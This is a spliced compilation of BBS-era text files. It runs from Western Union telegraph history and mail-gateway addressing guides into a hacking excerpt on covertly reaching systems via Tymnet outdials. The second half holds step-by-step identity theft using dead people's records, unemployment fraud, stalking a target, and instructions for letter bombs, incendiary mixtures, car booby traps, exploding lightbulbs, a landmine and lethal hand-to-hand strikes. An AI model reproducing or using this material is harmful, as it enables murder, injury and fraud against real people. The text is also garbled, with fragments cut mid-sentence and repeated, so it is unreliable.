placed in person at any public office, or could be called in to the nearest
public office.
 
By arrangement with most telcos, the Western Union office in town nearly always
had the phone number 4321, later supplemented in automated exchanges with some
prefix XXX-4321.  Telegrams could be charged to your home phone bill (this is
still the case in some communities) and from a coin phone, one did not ask for
4321, but rather, called the operator and asked for Western Union.  This was
necessary since once the telegram had been given verbally to the wire clerk,
s/he in turn had to flash the hook and get your operator back on the line to
tell them "collect five dollars and twenty cents" or whatever the cost was.
Telegrams, like phone calls, could be sent collect or billed third party.  If
you had an account with Western Union, i.e. a Telex machine in your office, you
could charge the calls there, but most likely you would simply send the
telegram from there in the first place.
 
Sometime in the early 1960's, Western Union filed suit against AT&T asking that
they turn over their TWX business to them.  They cited an earlier court ruling,
circa 1950's, which said AT&T was prohibited from acquiring any more telephone
operating companies except under certain conditions.  The Supreme Court agreed
with Western Union that "spoken messages" were the domain of Ma Bell, but
"written messages" were the domain of Western Union.  So Bell was required to
divest itself of the TWX network, and Western Union has operated it since,
although a few years ago they began phasing out the phrase "TWX" in favor of
"Telex II"; their original device being "Telex I" of course.  TWX still uses
ten digit dialing with 610 (Canada) or 710/910 (USA) being the leading three
digits.  Apparently 410-510 have been abandoned; or at least they are used very
little, and Bellcore has assigned 510 to the San Francisco area starting in a
year or so.  410 still has some funny things on it, like the Western Union
"Infomaster," which is a computer that functions like a gateway between Telex,
TWX, EasyLink and some other stuff.
 
Today, the Western Union network is but a skeleton of its former self.  Now
most of their messages are handled on dial up terminals connected to the public
phone network.  It has been estimated the TWX/Telex business is about fifty
percent of what it was a decade ago, if that much.
 
Then there was the Time Service, a neat thing which Western Union offered for
over seventy years, until it was discontinued in the middle 1960's.  The Time
Service provided an important function in the days before alternating current
was commonly available.  For example, Chicago didn't have AC electricity until
about 1945.  Prior to that we used DC, or direct current.
 
Well, to run an electric clock, you need 60 cycles AC current for obvious
reasons, so prior to the conversion from DC power to AC power, electric wall
clocks such as you see in every office were unheard of.  How were people to
tell the time of day accurately?  Enter the Western Union clock.
 
The Western Union, or "telegraph clock" was a spring driven wind up clock, but
with a difference.  The clocks were "perpetually self-winding," manufactured by
the Self-Winding Clock Company of New York City.  They had large batteries
inside them, known as "telephone cells" which had a life of about ten years
each.  A mechanical contrivance in the clock would rotate as the clock spring
unwound, and once each hour would cause two metal clips to contact for about
ten seconds, which would pass juice to the little motor in the clock which in
turn re-wound the main spring.  The principle was the same as the battery
operated clocks we see today.  The battery does not actually run the clock --
direct current can't do that -- but it does power the tiny motor which re-winds
the spring which actually drives the clock.
 
The Western Union clocks came in various sizes and shapes, ranging from the
smallest dials which were nine inches in diameter to the largest which were
about eighteen inches in diameter.  Some had sweep second hands; others did
not.  Some had a little red light bulb on the front which would flash.  The
typical model was about sixteen inches, and was found in offices, schools,
transportation depots, radio station offices, and of course in the telegraph
office itself.
 
The one thing all the clocks had in common was their brown metal case and
cream-colored face, with the insignia "Western Union" and their corporate logo
in those days which was a bolt of electricity, sort of like a letter "Z" laying
on its side.  And in somewhat smaller print below, the words "Naval Observatory
Time."
 
The local clocks in an office or school or wherever were calibrated by a
"master clock" (actually a sub-master) on the premises.  Once an hour on the
hour, the (sub) master clock would drop a metal contact for just a half second,
and send about nine volts DC up the line to all the local clocks.  They in turn
had a "tolerance" of about two minutes on both sides of the hour so that the
current coming to them would yank the minute hand exactly upright onto the
twelve from either direction if the clock was fast or slow.
 
The sub-master clocks in each building were in turn serviced by the master
clock in town; usually this was the one in the telegraph office.  Every hour on
the half hour, the master clock in the telegraph office would throw current to
the sub-masters, yanking them into synch as required.  And as for the telegraph
offices themselves, they were serviced twice a day by -- you guessed it -- the
Naval Observatory Master clock in Our Nation's Capitol, by the same routine.
Someone there would press half a dozen buttons at the same time, using all
available fingers; current would flow to every telegraph office and synch all
the master clocks in every community.  Western Union charged fifty cents per
month for the service, and tossed the clock in for free!  Oh yes, there was an
installation charge of about two dollars when you first had service (i.e. a
clock) installed.
 
The clocks were installed and maintained by the "clockman," a technician from
Western Union who spent his day going around hanging new clocks, taking them
out of service, changing batteries every few years for each clock, etc.
 
What a panic it was for them when "war time" (what we now call Daylight Savings
Time) came around each year!  Wally, the guy who serviced all the clocks in
downtown Chicago had to start on *Thursday* before the Sunday official
changeover just to finish them all by *Tuesday* following.  He would literally
rush in an office, use his screwdriver to open the case, twirl the hour hand
around one hour forward in the spring, (or eleven hours *forward* in the fall
since the hands could not be moved backward beyond the twelve going
counterclockwise), slam the case back on, screw it in, and move down the hall
to the next clock and repeat the process.  He could finish several dozen clocks
per day, and usually the office assigned him a helper twice a year for these
events.
 
He said they never bothered to line the minute hand up just right, because it
would have taken too long, and ".....anyway, as long as we got it within a
minute or so, it would synch itself the next time the master clock sent a
signal..."  Working fast, it took a minute to a minute and a half to open the
case, twirl the minute hand, put the case back on, "stop and b.s. with the
receptionist for a couple seconds" and move along.
 
The master clock sent its signal over regular telco phone lines.  Usually it
would terminate in the main office of whatever place it was, and the (sub)
master there would take over at that point.
 
Wally said it was very important to do a professional job of hanging the clock
to begin with.  It had to be level, and the pendulum had to be just right,
otherwise the clock would gain or lose more time than could be accommodated in
the hourly synching process.  He said it was a very rare clock that actually
was out by even a minute once an hour, let alone the two minutes of tolerance
built into the gear works.
 
     "...Sometimes I would come to work on Monday morning, and find out
     in the office that the clock line had gone open Friday evening.  So
     nobody all weekend got a signal.  Usually I would go down a manhole
     and find it open someplace where one of the Bell guys messed it up,
     or took it off and never put it back on.  To find out where it was
     open, someone in the office would 'ring out' the line; I'd go around
     downtown following the loop as we had it laid out, and keep listening
     on my headset for it.  When I found the break or the open, I would
     tie it down again and the office would release the line; but then I
     had to go to all the clocks *before* that point and restart them,
     since the constant current from the office during the search had
     usually caused them to stop."
 
But he said, time and again, the clocks were usually so well mounted and hung
that "...it was rare we would find one so far out of synch that we had to
adjust it manually.  Usually the first signal to make it through once I
repaired the circuit would yank everyone in town to make up for whatever they
lost or gained over the weekend..."
 
In 1965, Western Union decided to discontinue the Time Service.  In a nostalgic
letter to subscribers, they announced their decision to suspend operations at
the end of the current month, but said "for old time's sake" anyone who had a
clock was welcome to keep it and continue using it; there just would not be any
setting signals from the master clocks any longer.
 
Within a day or two of the official announcement, every Western Union clock in
the Chicago area headquarters building was gone.  The executives snatched them
off the wall, and took them home for the day when they would have historical
value.  All the clocks in the telegraph offices disappeared about the same
time, to be replaced with standard office-style electric wall clocks.

There are literally hundreds of systems connected to some of these larger
networks, like Tymnet and Telenet.  Navigation around these networks is very
simple, and usually well explained in their on-line documentation.
Furthermore, some systems will actually tell you what is connected and how to
get to it.  In the case of Tymnet, after dialing in, at the log in prompt, type
"information" for the on-line documentation.
 
Accessing systems through networks is as simple as providing an address for it
to connect to.  The best way to learn about the addresses and how to do things
on a network is to read "A Novice's Guide to Hacking (1989 Edition)" which was
in Issue 22, File 4 of 12, Volume Two (December 23, 1988).  Some points are
re-iterated here.
 
Once on a network, you provide the NUA (network user address) of the system you
wish to connect to.  NUAs are strings of 15 digits, broken up in to 3 fields,
the NETWORK ADDRESS, the AREA PREFIX, and the DNIC.  Each field has 5 digits,
and are left padded with 0's where necessary.
 
The DNIC determines which network to take the address from.  Tymnet, for
example, is 03106. 03110 is Telenet.
 
The AREA PREFIX and NETWORK ADDRESS determine the connection point.  By
providing the address of the system that you wish to connect to, you will be
accessing it through the net... as if you were calling it directly.  Obviously,
then, this provides one more level of security for access.
 
By connecting to an outdial, you can increase again the level of security you
enjoy, by using the outdial in that area to connect to the remote system.
 
Addendum -- Accessing Tymnet Over Local Packet Networks
 
This is just another way to get that extra step and/or bypass other routes.
This table is copied from Tymnet's on-line information.  As said earlier, it's
a great resource, this on-line information!

low profile, networks should provide a good access method.
 
If you can find a system that is connected to the Internet that you can get on
from Tymnet, you are doing well.

INTRODUCTION
 
DECWRL is a mail gateway computer operated by Digital's Western Research
Laboratory in Palo Alto, California.  Its purpose is to support the interchange
of electronic mail between Digital and the "outside world."
 
DECWRL is connected to Digital's Easynet, and also to a number of different
outside electronic mail networks.  Digital users can send outside mail by
sending to DECWRL::"outside-address", and digital users can also receive mail
by having your correspondents route it through DECWRL.  The details of incoming
mail are more complex, and are discussed below.
 
It is vitally important that Digital employees be good citizens of the networks
to which we are connected.  They depend on the integrity of our user community
to ensure that tighter controls over the use of the gateway are not required.
The most important rule is "no chain letters," but there are other rules
depending on whether the connected network that you are using is commercial or
non-commercial.
 
The current traffic volume (September 1989) is about 10,000 mail messages per
day and about 3,000 USENET messages per day.  Gatewayed mail traffic has
doubled every year since 1983.  DECWRL is currently a Vax 8530 computer with 48
megabytes of main memory, 2500 megabytes of disk space, 8 9600-baud (Telebit)
modem ports, and various network connections.  They will shortly be upgrading
to a Vax 8650 system.  They run Ultrix 3.0 as the base operating system.
 
 
ADMINISTRATION
 
The gateway has engineering staff, but no administrative or clerical staff.
They work hard to keep it running, but they do not have the resources to answer
telephone queries or provide tutorials in its use.
 
They post periodic status reports to the USENET newsgroup dec.general.  Various
helpful people usually copy these reports to the VAXNOTES "gateways" conference
within a day or two.
 
 
HOW TO SEND MAIL
 
DECWRL is connected to quite a number of different mail networks.  If you were
logged on directly to it, you could type addresses directly, e.g.
 
    To: strange!foreign!address.
 
But since you are not logged on directly to the gateway, you must send mail so
that when it arrives at the gateway, it will be sent as if that address had
been typed locally.
 
 
* Sending from VMS
 
If you are a VMS user, you should use NMAIL, because VMS mail does not know how
to requeue and retry mail when the network is congested or disconnected.  From
VMS, address your mail like this:
 
    To: nm%DECWRL::"strange!foreign!address"
 
The quote characters (") are important, to make sure that VMS doesn't try to
interpret strange!foreign!address itself.  If you are typing such an address
inside a mail program, it will work as advertised.  If you are using DCL and
typing directly to the command line, you should beware that DCL likes to remove
quotes, so you will have to enclose the entire address in quotes, and then put
two quotes in every place that one quote should appear in the address:
 
    $ mail test.msg "nm%DECWRL::""foreign!addr""" /subj="hello"
 
Note the three quotes in a row after foreign!addr.  The first two of them are
doubled to produce a single quote in the address, and the third ends the
address itself (balancing the quote in front of the nm%).
 
Here are some typical outgoing mail addresses as used from a VMS system:
 
    To: nm%DECWRL::"lll-winkin!netsys!phrack"
    To: nm%DECWRL::"postmaster@msp.pnet.sc.edu"
    To: nm%DECWRL::"netsys!phrack@uunet.uu.net"
    To: nm%DECWRL::"phrackserv@CUNYVM.bitnet"
    To: nm%DECWRL::"Chris.Jones@f654.n987.z1.fidonet.org"
 
 
* Sending from Ultrix
 
If your Ultrix system has been configured for it, then you can, from your
Ultrix system, just send directly to the foreign address, and the mail software
will take care of all of the gateway routing for you.  Most Ultrix systems in
Corporate Research and in the Palo Alto cluster are configured this way.
 
To find out whether your Ultrix system has been so configured, just try it and
see what happens.  If it doesn't work, you will receive notification almost
instantly.
 
    NOTE:  The Ultrix mail system is extremely flexible; it is almost
    completely configurable by the customer.  While this is valuable to
    customers, it makes it very difficult to write global instructions for
    the use of Ultrix mailers, because it is possible that the local changes
    have produced something quite unlike the vendor-delivered mailer.  One of
    the popular changes is to tinker with the meaning of quote characters (")
    in Ultrix addresses.  Some systems consider that these two addresses are
    the same:
 
        site1!site2!user@host.dec.com
 
    and
 
        "site1!site2!user"@host.dec.com
 
    while others are configured so that one form will work and the other
    will not.  All of these examples use the quotes.  If you have trouble
    getting the examples to work, please try them again without the quotes.
    Perhaps your Ultrix system is interpreting the quotes differently.
 
If your Ultrix system has an IP link to Palo Alto (type "/etc/ping
decwrl.dec.com" to find out if it does), then you can route your mail to the
gateway via IP.  This has the advantage that your Ultrix mail headers will
reach the gateway directly, instead of being translated into DECNET mail
headers and then back into Ultrix at the other end.  Do this as follows:
 
    To: "alien!address"@decwrl.dec.com
 
The quotes are necessary only if the alien address contains a ! character, but
they don't hurt if you use them unnecessarily.  If the alien address contains
an "@" character, you will need to change it into a "%" character.  For
example, to send via IP to joe@widget.org, you should address the mail
 
    To: "joe%widget.org"@decwrl.dec.com
 
If your Ultrix system has only a DECNET link to Palo Alto, then you should
address mail in much the same way that VMS users do, save that you should not
put the nm% in front of the address:
 
    To: DECWRL::"strange!foreign!address"
 
Here are some typical outgoing mail addresses as used from an Ultrix system
that has IP access.  Ultrix systems without IP access should use the same
syntax as VMS users, except that the nm% at the front of the address should not
be used.
 
    To: "lll-winken!netsys!phrack"@decwrl.dec.com
    To: "postmaster%msp.pnet.sc.edu"@decwrl.dec.com
    To: "phrackserv%CUNYVM.bitnet"@decwrl.dec.com
    To: "netsys!phrack%uunet.uu.net"@decwrl.dec.com
    To: "Chris.Jones@f654.n987.z1.fidonet.org"@decwrl.dec.com
 
 
DETAILS OF USING OTHER NETWORKS
 
All of the world's computer networks are connected together, more or less, so
it is hard to draw exact boundaries between them.  Precisely where the Internet
ends and UUCP begins is a matter of interpretation.
 
For purposes of sending mail, though, it is convenient to divide the network
universe into these categories:
 
Easynet         Digital's internal DECNET network.  Characterized by addresses
                of the form NODE::USER.  Easynet can be used for commercial
                purposes.
 
Internet        A collection of networks including the old ARPAnet, the NSFnet,
                the CSnet, and others.  Most international research,
                development, and educational organizations are connected in
                some fashion to the Internet.  Characterized by addresses of
                the form user@site.subdomain.domain.  The Internet itself
                cannot be used for commercial purposes.
 
UUCP            A very primitive network with no management, built with
                auto-dialers phoning one computer from another.  Characterized
                by addresses of the form place1!place2!user.  The UUCP network
                can be used for commercial purposes provided that none of the
                sites through which the message is routed objects to that.
 
USENET          Not a network at all, but a layer of software built on top of
                UUCP and Internet.
 
BITNET          An IBM-based network linking primarily educational sites.
                Digital users can send to BITNET as if it were part of
                Internet, but BITNET users need special instructions for
                reversing the process.  BITNET cannot be used for commercial
                purposes.
 
Fidonet         A network of personal computers.  I am unsure of the status of
                using Fidonet for commercial purposes, nor am I sure of its
                efficacy.
 
 
DOMAINS AND DOMAIN ADDRESSING
 
There is a particular network called "the Internet;" it is somewhat related to
what used to be "the ARPAnet."  The Internet style of addressing is flexible
enough that people use it for addressing other networks as well, with the
result that it is quite difficult to look at an address and tell just what
network it is likely to traverse.  But the phrase "Internet address" does not
mean "mail address of some computer on the Internet" but rather "mail address
in the style used by the Internet."  Terminology is even further confused
because the word "address" means one thing to people who build networks and
something entirely different to people who use them.  In this file an "address"
is something like "mike@decwrl.dec.com" and not "192.1.24.177" (which is what
network engineers would call an "internet address").
 
The Internet naming scheme uses hierarchical domains, which despite their title
are just a bookkeeping trick.  It doesn't really matter whether you say
NODE::USER or USER@NODE, but what happens when you connect two companies'
networks together and they both have a node ANCHOR??  You must, somehow,
specify which ANCHOR you mean.  You could say ANCHOR.DEC::USER or
DEC.ANCHOR::USER or USER@ANCHOR.DEC or USER@DEC.ANCHOR.  The Internet
convention is to say USER@ANCHOR.DEC, with the owner (DEC) after the name
(ANCHOR).
 
But there could be several different organizations named DEC.  You could have
Digital Equipment Corporation or Down East College or Disabled Education
Committee.  The technique that the Internet scheme uses to resolve conflicts
like this is to have hierarchical domains.  A normal domain isn't DEC or
STANFORD, but DEC.COM (commercial) and STANFORD.EDU (educational).  These
domains can be further divided into ZK3.DEC.COM or CS.STANFORD.EDU.  This
doesn't resolve conflicts completely, though:  both Central Michigan University
and Carnegie-Mellon University could claim to be CMU.EDU.  The rule is that the
owner of the EDU domain gets to decide, just as the owner of the CMU.EDU gets
to decide whether the Electrical Engineering department or the Elementary
Education department gets subdomain EE.CMU.EDU.
 
The domain scheme, while not perfect, is completely extensible.  If you have
two addresses that can potentially conflict, you can suffix some domain to the
end of them, thereby making, say, decwrl.UUCP be somehow different from
DECWRL.ENET.
 
DECWRL's entire mail system is organized according to Internet domains, and in
fact we handle all mail internally as if it were Internet mail.  Incoming mail
is converted into Internet mail, and then routed to the appropriate domain; if
that domain requires some conversion, then the mail is converted to the
requirements of the outbound domain as it passes through the gateway.  For
example, they put Easynet mail into the domain ENE           STATE           DENSITY  ACCESS NUMBER  NTWK

On a side note, the recent book The Cuckoo's Egg provides some interesting
information (in the form of a story, however) on a Tymnet hacker.  Remember
that he was into BIG things, and hence he was cracked down upon.  If you keep a
low profile, networks should provide a good access method.
 
If you can find a system that is connected to the Internet that you can get on
from Tymnet, you are doing well.
_______________________________________________________________________________
 
Username@f<node #>.n<net #>.z<zone #>.ifna.org
 
In other words, if I wanted to mail to Silicon Swindler at 1:135/5, the address
would be Silicon_Swindler@f5.n135.z1.ifna.org and, provided that your mailer
knows the .ifna.org domain, it should get through alright.  Apparently, as of
the writing of this article, they have implemented a new gateway name called
fidonet.org which should work in place of ifna.org in all routings.  If your
mailer does not know either of these domains, use the above routing but replace
the first "@" with a "%" and then afterwards, use either of the following
mailers after the "@":  CS.ORST.EDU or K9.CS.ORST.EDU (i.e. username%f<node
#>.n<net #>.z<zone #>.fidonet.org@CS.ORST.EDU [or replace CS.ORST.EDU with
K9.CS.ORST.EDU]).
 
The following is a list compiled by Bill Fenner (WCF@PSUECL.BITNET) that was
posted on INFONETS DIGEST which lists a number of FIDONET gateways:
 
Net      Node    Node Name
~~~      ~~~~    ~~~~~~~~~
104      56      milehi.ifna.org
105      55      casper.ifna.org
107      320     rubbs.ifna.org
109      661     blkcat.ifna.org
125      406     fidogate.ifna.org
128      19      hipshk.ifna.org
129      65      insight.ifna.org
143      N/A     fidogate.ifna.org
152      200     castle.ifna.org
161      N/A     fidogate.ifna.org
369      17      megasys.ifna.org
 
NOTE:  The UUCP equivalent node name is the first part of the node name.  In
       other words, the UUCP node milehi is listed as milehi.ifna.org but can
       be mailed directly over the UUCP network.
 
Another way to mail to FIDONET, specifically for Internet people, is in this
format:
 
ihnp4!necntc!ncoast!ohiont!<net #>!<node #>!user_name@husc6.harvard.edu
 
And for those UUCP mailing people out there, just use the path described and
ignore the @husc5.harvard.edu portion. There is a FIDONET NODELIST available on
most any FIDONET bulletin board, but it is quite large.
 
ONTYME
~~~~~~
Previously known as Tymnet, OnTyme is the McDonnell Douglas revision.  After
they bought out Tymnet, they renamed the company and opened an experimental
Internet gateway at ONTYME.TYMNET.COM but this is supposedly only good for
certain corporate addresses within McDonnell Douglas and Tymnet, not their
customers.  The userid format is xx.yyy or xx.y/yy where xx is a net name and
yyy (or y/yy) is a true username.  If you cannot directly nail this, try:
 
xx.yyy%ONTYME.TYM

So you want to become a Mercinary
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
by The Armagedeon
Disclaimer (hey I gotta cover my ass too)
	I am in ABSOLUTELY NO WAY responsible for the methods used in this 
text. YOU ARE RESPONSIBLE FOR YOUR ACTIONS. Don't even think about using the 
methods in this book against me, mainly because I have a MUCH larger supply 
of stuff like this then you do. (and I might add that I have close to 100 
lbs. of high explosives ex.TNT) I also have my other private book "so you
want to foil a mercenary".  
Well with that over I can move to the good stuff. 
	The main things needed to become a merc is: many fake ID's, a gun 
store (where else are you gonna get gun powder for explosives), a hardware
store (very useful for chemicals and other stuff), some money, this book 
(duh!), a clean record (at least in the town your in), and some form of 
transportation.
   What you first need to do is to study your subject VERY intensly. (when I
say VERY I mean you should know about as much as he knows about himself or 
more) Watch when he leaves his house look for patterns in his schedual, 
take notes (keep all notes together I'll tell you why later), know his car,
know the license plate #, know the serial # (found on the windshield on the
drivers side at the bottom), look for patterns of when he is alone. Above
all though, be very careful about the way you get this information. You 
wouldn't want this person to know about your little information gathering,
because he's liable to call the Pigs (oops) Cops on you. Be VERY secretive.
Don't trust anyone with any information about you or your subject. Live by 
your fake ID, (it's best to get one that's from a different country). Don't
live in a house, live in an appartment, and pay cash for everything. Don't 
get a credit card, chequeing account, or any account for that matter. Always
use cash. Use don't file income tax and basically don't exist (legally).
you'll need this!

How To Create A New Indentity                    By The Walking Glitch
                     Courtesy of the Jolly Roger!
             
You might be saying, "Hey Glitch, what do I need a new identity for?"
The answer is simple. You might want to go buy liquor somewhere, right?
You might want to go give the cops the false name when you get busted
so you keep your good name, eh?  You might even want to use the new
identity for getting a P.O. Box for carding. Sure! You might even
want the stuff for renting yourself a VCR at some dickless loser of a
convenience store. Here we go:
Getting a new ID isn't always easy, no one said it would be. By following
these steps, any bozo can become a new bozo in a coupla weeks.
STEP 1
The first step is to find out who exactly you'll become. The
most secure way is to use someone's ID who doesn't use it themselves.
The people who fit that bill the best are dead. As an added bonus they
don't go complaining one bit. Go to the library and look
through old death notices. You have to find someone who was born about
the same time as you were, or better yet, a year or two older
so you can buy booze, etc. You should go back as far as you can for the
death because most states now cross index deaths to births so people
can't do this in the future. The cutoff date in Wisconsin is 1979, folks
in this grand state gotta look in 1978 or earlier. Anything earier there
is cool. Now, this is the hardest part if you're younger. Brats that
young happen to be quite resilient, takin' falls out of three story windows
and eating rat poison like its Easter candy, and not a scratch or
dent. There ain't many that die, so ya gotta look your ass off. Go
down to the library and look up all the death notices you can,
if it's on microfilm so much the better. You might have to go through
months of death notices though, but the results are well worth it.
You gotta get someone who died locally in most instances: the death
certificate is filed only in the county of death. Now you go down to
the county courthouse in the county where he died and get the
death certificate, this will cost you around $3-$5 depending on the state
you're in. Look at this hunk of paper, it could be your way to
vanish in a clould of smoke when the right time comes, like right after
that big scam. If You're lucky, the slobs parents signed him up with
social security when he was a snot nosed brat. That'll be another piece
of ID you can get. If not, thats ok too. It'll be listed on the death
certificate if he has one. If you're lucky, the stiff was born
locally and you can get his birth certificate right away.
STEP 2
Now check the place of birth on the death certificate, if it's in
the same place you standing now you're all set. If not, you can mail
away for one from that county but its a minor pain and it might 
take a while to get, the librarian at the desk has listings of where
to write for this stuff and exactly how much it costs. Get the Birth
cirtificate, its worth the extra money to get it certified
because thats the only way some people will accept it for ID. When yur
gettin this stuff the little forms ask for the reason you want it,
instead of writing in "Fuck you", try putting in the word "Geneology".
They get this all the time.  If the Death certificate looks good for
you, wait a day or so before getting the certified birth certificate
in case they recognize someone wanting it for a dead guy.
STEP 3
Now your cookin! You got your start and the next part's easy.
Crank out your old Dot matrix printer and run off some mailing labels
addressed to you at some phony address. Take the time to check your
phony address that there is such a place. Hotels that rent by the month
or large apartment buildings are good, be sure to get the right zip
code for the area. These are things that the cops might notice that
will trip you up.  Grab some old junk mail and paste your new lables
on them. Now take them along with the birth certificate down to the library.
Get a new library card. If they ask you if you had one before say that
you really aren't sure because your family moved around alot when
you were a kid. Most libraries will allow you to use letters as a form
of ID when you get your card. If they want more give them a sob story
about how you were mugged and got your wallet stolen with all your
identification. Your card should be waiting for you in about two weeks.
Most libraries ask for two forms of ID, one can be your trusty Birth
Certificate, and they do allow letters addressed to you as a second
form.
STEP 4
    
Now you got a start, it isn't perfect yet, so let's continue. You should
have two forms of ID now. Throw away the old letters, or better yet
stuff them inside the wallet you intend to use with this stuff.
Go to the county courthouse and show them what nice ID you got and get
a state ID card. Now you got a picture ID. This will take about two weeks
and cost about $5, its well worth it.
STEP 5
If the death certificate had a social security number on it you can go
out and buy one of those metal SS# cards that they sell.
If it didn't, then you got all kinds of pretty ID that shows exactly
who you are. If you don't yet have an SS#, Go down and apply for one,
these are free but they could take five or six weeks to get,
Bureaucrats you know... You can invent a SS# too if ya like, but the motto
of 'THE WALKING GLITCH' has always been "Why not excellence?".
STEP 6
If you want to go whole hog you can now get a bank account in your new
name.  If you plan to do alot of traveling then you can put alot
of money in the account and then say you lost the account book.  After 
you get the new book you take out all the cash. They'll hit you
with a slight charge and maybe tie-up your money some, but if you're
ever broke in some small town that bank book will keep you from being
thrown in jail as a vagrant.
ALL DONE?
So kiddies, you got ID for buying booze, but what else? In some towns
(the larger the more likely) the cops if they catch you for something
petty like shoplifting stuff under a certain dollar amount, will just
give you a ticket, same thing for pissing in the street. Thats it!
No fingerprints or nothing, just pay the fine (almost always over $100)
or appear in court.  Of course they run a radio check on your ID, you'll
be clean and your alter-ego gets a blot on his record.
Your free and clear.  Thats worth the price of the trouble you've gone
through right there.  If your smart, you'll toss that ID away if this
happens, or better yet, tear off your picture and give the ID to someone
you don't like, maybe they'll get busted with it.
If you're a working stiff, here's a way to stretch your dollar. Go to work
for as long as it takes to get unemployment and then get yourself fired.
Go to work under the other name while your getting the unemployment.
With a couple of sets of ID, you can live like a king.  These concepts
for survival in the new age come to you compliments of THE WALKING GLITCH.

Calcium Carbide Bomb                            by The Jolly Roger
This is EXTREMELY DANGEROUS. Exercise extreme caution.... Obtain some
calcium carbide. This is the stuff that is used in carbide lamps and
can be found at nearly any hardware store. Take a few pieces of this
stuff (it looks like gravel) and put it in a glass jar with some
water. Put a lid on tightly. The carbide will react with the water to
produce acetylene carbonate which is similar to the gas used in
cutting torches. Eventually the glass with explode from internal
pressure. If you leave a burning rag nearby, you will get a nice
fireball!
  
    (About the notes always keep them together just in case you are 
successful and the Cops suspect you, you can very easily destroy them.)

Letter Bombs                            by The Jolly Roger
- You will first have to make a mild version of thermite. Use my 
recipe, but substitute iron fillings for rust. 
- Mix the iron with aluminum fillings in a ratio of 75% aluminum 
to 25% iron. This mixture will burn violently in a closed space 
(such as an envelope). This bring us to our next ingredient...
- Go to the post office and buy an insulated (padded) envelope. 
You know, the type that is double layered... Seperate the layers 
and place the mild thermite in the main section, where the letter 
would go. Then place magnesium powder in the outer layer. There is 
your bomb!!
- Now to light it... this is the tricky part and hard to explain. 
Just keep experimenting until you get something that works. The 
fuse is just that touch explosive I have told you about in another 
one of my anarchy files. You might want to wrap it like a long 
cigarette and then place it at the top of the envelope in the 
outer layer (on top of the powdered magnesium). When the touch 
explosive is torn or even squeezed hard it will ignite the 
powdered magnesium (sort of a flash light) and then it will burn 
the mild thermite. If the thermite didn't blow up, it would at 
least burn the fuck out of your enemy (it does wonders on human 
flesh!).

Wasn't that just ever so much fun!!

Here's one that you'll really get a blast out of
Solidox Bombs                                   by The Jolly Roger
Most people are not aware that a volatile, extremely explosive 
chemical can be bought over the counter:  Solidox.
Solidox comes in an aluminum can containing 6 grey sticks, and can 
be bought at Kmart, and various hardware supply shops for around 
$7.00.  Solidox is used in welding applications as an oxidizing 
agent for the hot flame needed to melt metal.  The most active 
ingredient in Solidox is potassium chlorate, a filler used in many 
military applications in the WWII era.
Since Solidox is literally what the name says:  SOLID OXygen, you 
must have an energy source for an explosion.  The most common and 
readily available energy source is common household sugar, or 
sucrose.  In theory, glucose would be the purest energy source, 
but it is hard to find a solid supply of glucose.
Making the mixture:
[1]  Open the can of Solidox, and remove all 6 sticks.  One by 
     one, grind up each of the sticks (preferably with a mortar 
     and pestle) into the finest powder possible.
[2]  The ratio for mixing the sugar with the Solidox is 1:1, so 
     weigh the Solidox powder, and grind up the equivalent amount 
     of sugar.
[3]  Mix equivalent amounts of Solidox powder, and sugar in a 1:1 
     ratio.
It is just that simple!  You now have an extremely powerful 
substance that can be used in a variety of applications.  A word 
of caution:  be EXTREMELY careful in the entire process.  Avoid 
friction, heat, and flame.  A few years back, a teenager I knew 
blew 4 fingers off while trying to make a pipe bomb with Solidox.  
You have been warned!
SolidOx can no longer be bought in KMart.  A plumbing and heating supply
store, or even Sears may have small quantities for sale, at about
$18.00 for 10 stix.

    Another truely original form of sabotage (which is original because I 
just thought of it) is to load a tennis ball FULL of strike anywhere match 
heads and keep that around. Then you take a dish, fill it up with drano, 
then put it in a place that is it very likely that it wouldn't be noticed.
Put the tennis ball under the drivers side seat so that when he sits down he
will put pressure on the tennis ball. Put LOTS of aluminum foil in the dish 
of drano and close the door. This is a sure fire winner because by sitting
down he will make the tennis ball with match head go up and Drano + aluminum
=HYDROGEN HA HA HA!!!! You shouldn't be hearing from that loser again (or at
least until he gets out of the burn unit which should be a couple of years)
PRETTY GOOD EH!!!!!
    Another truely great trap is the Exploding lightbulbs which is a light
bulb taken apart without disturbing the filament you fill the glass with 
black powder or some other nasty explosive. You assemble the bulb again and
presto you have an exploding lightbulb. You put it into the socket (with the
switch off of course)and then it is armed and ready. If they turn on the 
switch BOOOOOOOOOOOOOOOOMMMMMMMM!!!!!!!!!!!!!!!! The coroner has to pick 
them up with a sponge!!!!!!!
    Another GREAT one is the LAND MINE (HE HE HE ) so here's the article.
How to make a landmine                          by The Jolly Roger
First, you need to get a pushbutton switch. Take the wires of it 
and connect one to a nine volt battery connector and the other to 
a solar igniter (used for launching model rockets). A very thin 
piece of stereo wire will usually do the trick if you are 
desperate, but I recommend the igniter. Connect the other wire of 
the nine-volt battery to one end of the switch. Connect a wire 
from the switch to the other lead on the solar igniter. 
       switch-----------battery
         \                  /
          \                /
           \              /
            \            /
            solar  igniter 
                  |
                  | 
                  |
              explosive
Now connect the explosive (pipe bomb, m-80, CO2 bomb, etc.) to the 
igniter by attaching the fuse to the igniter (seal it with scotch 
tape). Now dig a hole; not too deep but enough to cover all of the 
materials. Think about what direction your enemy will be coming from
and plant the switch, but leave the button visible (not TOO 
visible!). Plant the explosive about 3-5 feet away from the switch 
because there will be a delay in the explosion that depends on how 
short your wick is, and, if a homemade wick is being used, its 
burning speed. But if you get it right... and your enemy is close 
enough......... BBBBBBBOOOOOOOOOOOOOOOOOOOOOOOOMMMM! hahahaha

            AN EXCERPT FROM THE ANARCHISTS COOKBOOK II.....
                         Courtesy of Exodus
This file will explain the basics of hand-to-hand combat, and will tell
of the best places to strike and kill an enemy...
When engaged in hand-to-hand combat, your life is always at stake.
There is only one purpose in combat, and that is to kill your enemy.
Never face an enemy with the idea of knocking him out.
The chances are extremely good that he will kill YOU instead.
When a weapon is not available, one must resort to the full
use of his natural weapons. The natural weapons are:
1. The knife edge of your hands.
2. Fingers folded at the second joint or knuckle.
3. The protruding knuckle of your second finger.
4. The heel of your hand.
5. Your boot
6. Elbows
7. Knees
8. and Teeth.
Attacking is a primary factor. A fight was never 
won by defensive action. Attack with all of your strength.
At any point or any situation, some vulnerable point on your enemies
body will be open for attack. Do this while screaming as screaming has
two purposes.
1. To frighten and confuse your enemy.
2. To allow you to take a deep breath which, in turn, will put
more oxygen in your blood stream. Your balance and balance of your
enemy are two inportant factors; since, if you succeed in making
